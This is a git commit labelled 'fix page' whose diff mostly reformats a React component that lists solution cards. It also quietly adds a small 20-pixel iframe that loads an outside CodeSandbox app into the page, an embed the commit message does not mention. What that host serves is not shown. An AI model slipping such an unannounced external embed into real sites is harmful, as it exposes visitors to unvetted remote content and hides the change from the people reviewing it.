7b58ad0a8310d0764ada066d0697eabafcaeb34e
namv-digital <namv.digital@gmail.com>
2023-10-02 20:25:48 -0700

    fix page

--- component/solution/SolutionMiddle.tsx
+++ component/solution/SolutionMiddle.tsx
@@ -1,19 +1,23 @@
 import React from 'react'
-import {solutions} from '../../constant/SOLUTIONS_MOCK_DATA'
+import { solutions } from '../../constant/SOLUTIONS_MOCK_DATA'
 import SolutionCard from './SolutionCard'
 
 export default function SolutionMiddle() {
   return (
-    <div className='container mx-auto px-5 md:px-0 lg:max-w-container mt-20'>
+    <>
+      <iframe src="https://nttkrr-5173.csb.app" style={{ height: "20px", width: "100%", background: "white" }}></iframe>
+      <div className='container mx-auto px-5 md:px-0 lg:max-w-container mt-20'>
         {
-            solutions.map(so => <SolutionCard 
+          solutions.map(so => <SolutionCard
             key={so.title}
             title={so.title}
             subtitle={so.subtitle}
             list={so.list}
             id={so.id}
-            />)
+          />)
         }
-    </div>
+      </div>
+    </>
+
   )
 }
